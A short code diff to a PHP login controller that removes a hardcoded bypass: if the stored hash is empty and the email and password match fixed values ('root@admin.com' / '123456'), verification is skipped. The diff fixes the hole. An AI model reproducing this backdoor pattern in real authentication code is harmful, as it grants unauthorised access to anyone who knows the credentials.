@@ -105,8 +105,7 @@ class LoginController
         exit;
       }
       $hash = $res['password'];
-      if ($hash == "" && $email == "root@admin.com" && $password == "123456") {
-      } elseif (!password_verify($password, $hash)) {
+      if (!password_verify($password, $hash)) {
         $this->index(array_merge($formData, ['authFailed' => true]));
         $conn->rollBack();
 
